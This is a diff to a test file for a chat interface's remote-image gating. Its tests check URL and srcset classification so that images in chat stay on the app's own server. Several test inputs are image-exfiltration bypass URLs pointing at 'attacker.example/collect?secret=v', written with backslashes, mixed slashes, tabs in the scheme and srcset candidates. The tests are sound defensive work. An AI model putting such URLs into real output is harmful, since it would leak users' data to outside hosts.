@@ -48,7 +48,7 @@ vi.mock("~/lib/openPullRequestLink", () => ({
 
 import ChatMarkdown from "~/components/ChatMarkdown";
 
-import { remoteImageAddress } from "./remoteImageAddress";
+import { hasRemoteSrcSet, remoteImageAddress, srcSetCandidateUrls } from "./remoteImageAddress";
 
 const threadRef = {
   environmentId: EnvironmentId.make("env-remote-images"),
@@ -199,6 +199,30 @@ describe("web images in chat", () => {
     );
   });
 
+  it("drops a picture source that resolves to another server behind a same-origin image", async () => {
+    const { host, render } = await mount();
+    const sameOrigin = `${window.location.origin}/logo.png`;
+    for (const srcset of [
+      "/\\attacker.example/collect?secret=v",
+      "\\\\attacker.example/collect",
+      "/\\/attacker.example/collect",
+      `/local.png 1x, HTTPS://attacker.example/collect 2x`,
+    ]) {
+      await render(
+        `<picture><source srcset="${srcset}"><img src="${sameOrigin}" alt="logo"></picture>`,
+      );
+
+      expect(host.querySelectorAll("source")).toHaveLength(0);
+      expect(host.querySelector('[role="group"]')).toBeNull();
+      expect(imageSources(host)).toEqual([sameOrigin]);
+    }
+    // A picture whose every candidate stays on the app keeps its source.
+    await render(
+      `<picture><source srcset="/wide.png 2x"><img src="${sameOrigin}" alt="logo"></picture>`,
+    );
+    expect(host.querySelector("source")?.getAttribute("srcset")).toBe("/wide.png 2x");
+  });
+
   it("gates remote videos written with image syntax", async () => {
     const { host, render } = await mount();
     await render("![Run](https://media.example.org/run.mp4)");
@@ -231,6 +255,15 @@ describe("web images in chat", () => {
     // The image address is shown as text: the link stays the only link.
     expect(card?.textContent).toContain("ci.example.org/badge.svg");
 
+    // happy-dom follows a link while the click is still bubbling, before React's root listener
+    // runs; browsers follow it only after dispatch, when `defaultPrevented` decides. Keep
+    // happy-dom from opening the page so the test makes no request, and assert on the flag.
+    const happyDom = (
+      globalThis as {
+        happyDOM?: { settings: { navigation: { disableChildPageNavigation: boolean } } };
+      }
+    ).happyDOM;
+    if (happyDom) happyDom.settings.navigation.disableChildPageNavigation = true;
     const click = new MouseEvent("click", { bubbles: true, cancelable: true });
     await act(() => loadButton(host).dispatchEvent(click));
 
@@ -285,34 +318,88 @@ describe("web images in chat", () => {
   });
 });
 
+const DESKTOP = { baseUrl: "scient://app/index.html", appUrl: "scient://app/index.html" };
+const WEB = {
+  baseUrl: "https://scient.example/threads/1",
+  appUrl: "https://scient.example/threads/1",
+};
+
 describe("remoteImageAddress", () => {
   it("classifies web sources as remote and everything Scient serves as local", () => {
-    expect(remoteImageAddress("https://a.example/x/y.png?q=1", "scient://app")).toEqual({
+    expect(remoteImageAddress("https://a.example/x/y.png?q=1", DESKTOP)).toEqual({
       url: "https://a.example/x/y.png?q=1",
       host: "a.example",
       label: "a.example/x/y.png",
     });
-    expect(remoteImageAddress("HTTP://a.example", "scient://app")?.label).toBe("a.example");
-    expect(remoteImageAddress("//a.example/p.png", null)?.url).toBe(
-      `${window.location.protocol}//a.example/p.png`,
-    );
-    expect(remoteImageAddress("http://127.0.0.1:4000/p.png", "scient://app")?.host).toBe(
-      "127.0.0.1:4000",
-    );
-    expect(remoteImageAddress("https://xn--e1afmkfd.example/p", null)?.host).toBe(
+    expect(remoteImageAddress("http://127.0.0.1:4000/p.png", DESKTOP)?.host).toBe("127.0.0.1:4000");
+    expect(remoteImageAddress("https://xn--e1afmkfd.example/p", DESKTOP)?.host).toBe(
       "xn--e1afmkfd.example",
     );
-    for (const local of ["data:image/png;base64,AA==", "blob:https://a/1", "results/p.png"]) {
-      expect(remoteImageAddress(local, null)).toBeNull();
+    for (const local of [
+      "data:image/png;base64,AA==",
+      "blob:https://a/1",
+      "/logo.png",
+      "logo.png",
+      "https://scient.example/logo.png",
+      "//scient.example/logo.png",
+    ]) {
+      expect(remoteImageAddress(local, WEB)).toBeNull();
     }
-    expect(remoteImageAddress("http://localhost:5173/p.png", "http://localhost:5173")).toBeNull();
+    // The desktop's private scheme is answered by its protocol handler, whatever the host.
+    expect(remoteImageAddress("//cdn.example/logo.png", DESKTOP)).toBeNull();
+    expect(remoteImageAddress("//cdn.example/logo.png", WEB)?.url).toBe(
+      "https://cdn.example/logo.png",
+    );
   });
 
-  it("still treats an unparsable web address as remote and shows it verbatim", () => {
-    expect(remoteImageAddress("https://[bad", null)).toEqual({
+  it.each([
+    ["a backslash network path", "/\\attacker.example/collect?secret=v"],
+    ["a double backslash", "\\\\attacker.example/collect"],
+    ["mixed slashes", "/\\/attacker.example/collect"],
+    ["a tab inside the scheme", "ht\ttps://attacker.example/collect"],
+    ["a newline inside the scheme", "ht\ntps://attacker.example/collect"],
+    ["an uppercase scheme", "HTTPS://ATTACKER.EXAMPLE/collect"],
+  ])("resolves %s the way the browser does", (_name, source) => {
+    expect(remoteImageAddress(source, WEB)?.host).toBe("attacker.example");
+  });
+
+  it("treats addresses the parser rejects, and non-web schemes, as remote", () => {
+    expect(remoteImageAddress("https://[bad", WEB)).toEqual({
       url: "https://[bad",
       host: "https://[bad",
       label: "https://[bad",
     });
+    expect(remoteImageAddress("logo.png", { baseUrl: null, appUrl: null })).not.toBeNull();
+    expect(remoteImageAddress("file://server/share/p.png", DESKTOP)).not.toBeNull();
+  });
+});
+
+describe("srcset classification", () => {
+  it("splits candidates by the HTML srcset rules", () => {
+    expect(srcSetCandidateUrls("a.png 1x, b.png 2x")).toEqual(["a.png", "b.png"]);
+    // A comma inside a URL belongs to it; trailing commas end a URL without descriptors.
+    expect(srcSetCandidateUrls("a.png,b.png")).toEqual(["a.png,b.png"]);
+    expect(srcSetCandidateUrls("a.png,, b.png")).toEqual(["a.png", "b.png"]);
+    expect(srcSetCandidateUrls("data:image/png;base64,AA== 1x,\n//x.example/c 2x")).toEqual([
+      "data:image/png;base64,AA==",
+      "//x.example/c",
+    ]);
+    // A comma inside parenthesised descriptors does not start a new candidate.
+    expect(srcSetCandidateUrls("a.png 100w (x, y), b.png")).toEqual(["a.png", "b.png"]);
+    expect(srcSetCandidateUrls(" , ")).toEqual([]);
+  });
+
+  it("flags a source when any candidate reaches another server", () => {
+    expect(hasRemoteSrcSet("/a.png 1x, data:image/png;base64,AA== 2x", WEB)).toBe(false);
+    expect(hasRemoteSrcSet("/a.png 1x, /\\attacker.example/c 2x", WEB)).toBe(true);
+    // In srcset a tab is a separator: the browser requests the same-origin "ht", not the host.
+    expect(srcSetCandidateUrls("ht\ttps://attacker.example/c")).toEqual(["ht"]);
+    expect(hasRemoteSrcSet("ht\ttps://attacker.example/c", WEB)).toBe(false);
+    expect(hasRemoteSrcSet("data:image/png;base64,AA== 1x,\n\\\\attacker.example/c", WEB)).toBe(
+      true,
+    );
+    expect(hasRemoteSrcSet("/a.png 100w (x, https://attacker.example/c), b.png", WEB)).toBe(false);
+    expect(hasRemoteSrcSet("/a.png 100w, HTTPS://attacker.example/c 200w", WEB)).toBe(true);
+    expect(hasRemoteSrcSet(undefined, WEB)).toBe(false);
   });
 });
